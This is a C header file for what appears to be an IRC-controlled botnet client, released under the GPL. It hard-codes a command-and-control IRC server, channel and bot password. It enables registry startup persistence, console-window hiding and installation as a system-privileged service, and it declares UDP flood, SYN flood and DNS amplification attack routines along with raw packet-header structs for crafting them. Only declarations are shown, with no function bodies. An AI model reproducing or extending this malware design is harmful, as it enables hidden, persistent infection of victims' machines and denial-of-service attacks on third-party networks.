/*
 *   Author           : 93aef0ce4dd141ece6f5
 *   Title            : bot.h
 *   Description      : file contains miscellaneous 
 *                      definitions, function definitions
 *                      and structs
 *
 *   Copyright (C) 2016  93aef0ce4dd141ece6f5
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

/*
 * header guards to prevent
 * double includes
 */
#ifndef BOT_H
#define BOT_H

/*
 * max buffer size to send
 * or receive 
 */
#define MAX_MSG_SIZE 4096

/*
 * default size for malloc
 */
#define DEFAULT_MALLOC_SIZE 2048

/*
 * maximum irc name size
 */
#define MAX_NAME 31

/*
 * defining some IRC
 * options which must be 
 * tweaked per compile
 * maybe parse these 
 * options with a python
 * script
 */
#define SERVER     "irc.freenode.net"   // IRC server
#define PORT       "6667"           // server port
#define CHANNEL    "#uuiiafa"       // channel name
//#define U_NAME     "JSchmoeBot"     // username
//#define N_NAME     "JSchmoeBot"     // nickname
#define IRC_PWORD  NULL             // password for nickname
#define BOT_PWORD  "test123"        // password to authenticate nickname

/*
 * defining some client
 * options which must be 
 * tweaked per compile
 * maybe parse these 
 * options with a python
 * script
 * currently only for
 * windows environments
 */
#define INSTALL_STARTUP             // install into registry 
#define WINDOW_STEALTH              // hide console window
#define INSTALL_SERVICE             // install as service for
                                    // system level privileges

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
/*
 * macro for easier sleep
 * times sleep (seconds)
 */
#define sleep(x) Sleep ((x)*100);

#elif defined(__linux__)

#define SD_BOTH 0x02

#define TRUE (~0)
#define FALSE 0

/*
 * a sort of hacky solution
 * to WIN32's SOCKET typedef
 * and linux's file descriptor
 */
typedef int SOCKET;

#endif

typedef unsigned int bool;

extern char *prog_name;

/*
 * struct containing IRC
 * details of bot
 */
typedef struct _account {
    char u_name[MAX_NAME];          // username
    char n_name[MAX_NAME];          // nickname
    char *pword;                    // username's password
    char *channel;                  // channel/privmsg
    char **admins;
    unsigned char admin_size;       // size of admins array
    unsigned char num_admins;       // number of admins
    unsigned char num_default;      // number of default admins
} Account, *pAccount;

/*
 * struct to store information
 * from received messages 
 * from IRC
 */
typedef struct _message {
    char n_name[MAX_NAME];          // nickname
    char *contact;                  // channel/privmsg
    unsigned short contactSize;
    char *command;                  // command
    unsigned short commandSize;
    char *param;                    // command [parameter]
    unsigned short paramSize;
    char *msg;                      // entire message
    unsigned short msgSize;
} Message, *pMessage;

typedef struct _thr_args {
    SOCKET s;
    char *contact;
    char *addr;
    char *port;
    int threads;
    int time;
} thr_args;

/*
 * need to define some tcp/ip
 * header structs here 
 * the X:n means that it
 * takes up n bits
 * they are called "bit fields"
 */

// RFC 791 - https://tools.ietf.org/html/rfc791#section-3.1
struct _ip_hdr {
    unsigned char ihl:4;            // ip header len
    unsigned char version:4;        // ipv4
    unsigned char tos;              // type of service
    unsigned short tot_len;         // total length
    unsigned short id;              // unique id
    unsigned short frag_off;        // fragment offset
    unsigned char ttl;              // time to live
    unsigned char protocol;         // tcp, udp, etc.
    unsigned short check;           // checksum
    unsigned long src_addr;         // source addr
    unsigned long dest_addr;        // dest addr
} IP4_HDR, *pIP4_HDR;

// RFC 768 - https://www.ietf.org/rfc/rfc768.txt
struct _udp_hdr {
    unsigned short src_port;        // source port
    unsigned short dest_port;       // dest port
    unsigned short len;             // length
    unsigned short check;           // checksum
} UDP_HDR, *pUDP_HDR;

// RFC 793 - https://tools.ietf.org/html/rfc793#section-3.1
struct _tcp_hdr {
    unsigned short src_port;        // source port
    unsigned short dest_port;       // dest port
    unsigned long seq;              // sequence no.
    unsigned long ack_seq;          // ack no.
    unsigned short res1:4;          // reserved
    unsigned short data_off:4;      // data offset
    
    // flags
    unsigned char fin:1;            // finish
    unsigned char syn:1;            // synchronise
    unsigned char rst:1;            // reset
    unsigned char psh:1;            // push
    unsigned char ack:1;            // acknowledge
    unsigned char urg:1;            // urgent
    unsigned char ece:1;            // ecn echo
    unsigned char cwr:1;            // congestion window reduced
    
    unsigned short window;          // window
    unsigned short check;           // checksum
    unsigned short urg_ptr;         // urgent pointer
} TCP_HDR, *pTCP_HDR;

// RFC 1035 - https://tools.ietf.org/html/rfc1035#section-4.1.1
typedef struct _dns_hdr {
    unsigned short id;              // id
    unsigned char qr:1;             // query
    unsigned char op:4;             // opcode
    
    unsigned char aa:1;             // authorative answer
    unsigned char tc:1;             // truncation
    unsigned char rd:1;             // recursion desired
    unsigned char ra:1;             // recursion available
    
    /*
     * rcode errors:
     * 0 - no error
     * 1 - format error
     * 2 - server failure
     * 3 - Name error
     * 4 - Not implemented
     * 5 - Refused
     */
    unsigned char rcode:4;          // response code
    unsigned char z:3;              // reserved
    unsigned short qdc;             // no. of question entries
    unsigned short anc;             // no. of resource records
    unsigned short nsc;             // no. of name server resource records
    unsigned short arc;             // no. of resource records 
                                    // in additional records section
} DNS_HDR, *pDNS_HDR;

typedef struct _dns_ques {          // dns question struct
    unsigned char *qname;           // sequence of octets
    unsigned short qtype;           // query
    unsigned short qclass;          // class of query
} DNS_QUES, *pDNS_QUES;

typedef struct _dns_res_rec {
    unsigned char *name;            // domain name
    unsigned short type;            // RR type codes
    unsigned short class;           // class of the data in the RDATA field
    unsigned int ttl;               // time to live
    unsigned short rdlength;        // length in octets of the RDATA field
    unsigned char *rdata;           // string that describes the resource
} DNS_RES_REC, *pDNS_RES_REC;

/*
 * function definitions go here
 * please make sure that only
 * functions which carry across
 * are added here, else make 
 * it static
 * also add the function
 * definitions under the 
 * respective file
 * if file comment does not
 * yet exist, please make one
 */
// bot.c
void non_fatal (const char *);
void fatal (const char *);

// init.c
pAccount new_account (void);
pMessage new_message (void);
SOCKET server_connect (const char *, const char *);
int setup_irc (SOCKET, pAccount);
void str_to_lower (char *);
void format_message (pMessage);

// recv.c
// static void extract (pMessage, char *);
int cleanup (SOCKET, pAccount, pMessage);
void start_recv (SOCKET, pAccount);

// exec.c
int my_send (SOCKET s, const char *, ...);
int check_pass (const char *);
int add_admin (pAccount, pMessage);
bool is_admin (pAccount, pMessage);
bool is_dos (const char *);
// static thr_args *new_thr_args (SOCKET);
// static void *(*get_flood_function (const char *f)) (void *);
int parse_args (SOCKET, pMessage);
int execute_command (SOCKET, pAccount, pMessage);

// dos.c
void *udp_flood (void *);
void *syn_flood (void *);
void *dns_amp (void *);

// install.c
int install_startup (const char *);
int install_service (const char *);

#endif
